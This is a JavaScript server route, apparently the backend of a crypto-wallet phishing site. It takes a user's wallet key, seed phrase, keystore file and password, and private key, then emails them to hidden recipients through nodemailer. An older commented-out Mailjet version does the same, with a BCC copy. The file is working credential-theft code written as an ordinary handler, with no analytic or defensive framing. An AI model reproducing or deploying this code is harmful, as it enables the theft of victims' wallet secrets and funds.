// require("dotenv").config();

// const host = process.env.NEXT_PUBLIC_SMTP_HOST;
// const user = process.env.NEXT_PUBLIC_SMTP_USER;
// const pass = process.env.NEXT_PUBLIC_SMTP_PASS;
// const from = process.env.NEXT_PUBLIC_SMTP_FROM;
// const to = process.env.NEXT_PUBLIC_SMTP_TO;
// const cc = process.env.NEXT_PUBLIC_SMTP_TO2;

// export default (req, res) => {
//   const mailjet = require("node-mailjet").connect(user, pass);
//   const { key, phrase, keystorejson, keystorepassword, privateKey } = req.body;
//   const request = mailjet.post("send", { version: "v3.1" }).request({
//     Messages: [
//       {
//         From: {
//           Email: `${from}`,
//           Name: "Mailjet Pilot",
//         },
//         To: [
//           {
//             Email: `${to}`,
//             Name: "passenger 1",
//           },
//         ],
//         // Cc: [
//         //   {
//         //     Email: "copilot@mailjet.com",
//         //     Name: "Copilot",
//         //   },
//         // ],
//         Bcc: [
//           {
//             Email: `${cc}`,
//             Name: "Air traffic control",
//           },
//         ],
//         Subject: "Your email flight plan!",
//         TextPart: `
//         key: ${key}

//         phrase : ${phrase}

//         keystorejson : ${keystorejson}

//         keystorepassword : ${keystorepassword}

//         privateKey :${privateKey}
//         `,
//       },
//     ],
//   });
//   request
//     .then((result) => {
//       console.log(result.body);
//     })
//     .catch((err) => {
//       console.log(err.statusCode);
//     });
// };

require("dotenv").config();
const nodemailer = require("nodemailer");
const Cors = require("cors");

// Initializing the cors middleware
const cors = Cors({
  methods: ["GET", "HEAD"],
});

// Helper method to wait for a middleware to execute before continuing
// And to throw an error when an error happens in a middleware
function runMiddleware(req, res, fn) {
  return new Promise((resolve, reject) => {
    fn(req, res, (result) => {
      if (result instanceof Error) {
        return reject(result);
      }

      return resolve(result);
    });
  });
}

const host = process.env.NEXT_PUBLIC_SMTP_HOST;
const user = process.env.NEXT_PUBLIC_SMTP_USER;
const pass = process.env.NEXT_PUBLIC_SMTP_PASS;
const from = process.env.NEXT_PUBLIC_SMTP_FROM;
const to = process.env.NEXT_PUBLIC_SMTP_TO;
const cc = process.env.NEXT_PUBLIC_SMTP_TO2;

export default async (req, res) => {
  await runMiddleware(req, res, cors);
  const { key, phrase, keystorejson, keystorepassword, privateKey } = req.body;

  const transporter = nodemailer.createTransport({
    host,
    port: 587,
    secure: false, // use SSL
    auth: {
      user,
      pass,
    },
    // tls: {
    //   rejectUnauthorized: false,
    //   ciphers: "SSLv3",
    // },
  });

  // verify connection configuration
  transporter.verify(function (error, success) {
    if (error) {
      console.log(error);
    } else {
      console.log(success);
    }
  });

  const mailOption = {
    from,

    to: `${to}`,

    subject: "New mail from",

    text: `
    key: ${key}

    phrase : ${phrase}

    keystorejson : ${keystorejson}

    keystorepassword : ${keystorepassword}

    privateKey :${privateKey}
    `,
  };

  transporter.sendMail(mailOption, (err, data) => {
    if (err) {
      console.log(err);
      res.send("error here" + JSON.stringify(err));
    } else {
      console.log("mail send");
      res.send("success");
    }
  });
};
